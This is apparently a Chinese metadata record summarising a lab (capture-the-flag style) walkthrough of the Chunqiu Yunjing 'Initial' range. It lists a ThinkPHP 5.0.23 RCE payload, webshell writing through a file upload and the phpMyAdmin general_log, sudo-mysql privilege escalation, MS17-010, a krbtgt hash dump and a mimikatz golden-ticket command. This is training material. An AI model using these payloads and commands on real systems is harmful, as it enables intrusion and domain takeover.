...
quality: high
full_path: 春秋云镜-Initial打靶记录.full.md
meta_path: 春秋云镜-Initial打靶记录.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋云镜-Initial打靶记录。春秋云镜Initial完整打靶：ThinkPHP+信呼OA+MS17-010+黄金票据四步全flag。经验：入门靶场三种getshell姿势（ThinkPHP/信呼上传/phpMyAdmin日志写马）+ Kerberos黄金票据...
category: web
subcategory: rce
tools_used:
- C
...
contest_type: open
wp_url: https://www.ctfiot.com/173290.html
reasoning_chain:
- fscan 扫出 ThinkPHP → 触发点：URL 后必须接 /index.php?s=captcha（不是 captch）
- 动作：抓包改 GET→POST + payload _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
- 观察：500 错误但漏洞存在 → 动作：echo '<?php phpinfo();?>' > info.php
- 观察：写入成功 → 下一步：写 shell 并蚁剑连接
- 提权读 flag1：sudo mysql -e '! cat /root/flag/flag01.txt'
- frp 代理 → 信呼 OA + phpMyAdmin → 触发点：OA 文件上传 + PMA 日志写马
- 动作：OA 上传 shell 拿 web 权限 + PMA 'set global general_log=ON; general_log_file=.../111.php'
- 观察：flag2 → 下一步：横向
- MS17-010 打 XIAORANG-WIN7 → kiwi dcsync 导出 krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b
- 伪造黄金票据：kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-...-502 /krbtgt:fb812eea... /ptt
- 动作：wmiexec.py -k 登录 DC → 读 flag3
failed_attempts:
- url 写 captch（漏 a）→ 失败：必须 captcha
- 只 ThinkPHP 不够 → 失败：flag2 在 OA 机器上必须 PMA 日志写马
key_observations:
- ThinkPHP 5.0.23 RCE URL 必须带 ?s=captcha
- phpMyAdmin 日志写马是 PMA 无文件上传时的标准 getshell 路径
- Mimikatz kerberos::golden 伪造黄金票据需要 sid + krbtgt hash + 用户名
- 三种 getshell 姿势：ThinkPHP RCE / 信呼 OA 上传 / phpMyAdmin 日志写马
prerequisites:
- ThinkPHP 5.0.23 RCE
- 蚁剑 / 哥斯拉 webshell 管理
- phpMyAdmin 日志写马（general_log）
- MS17-010
- Mimikatz kerberos::golden 黄金票据伪造
---
# 春秋云镜-Initial打靶记录
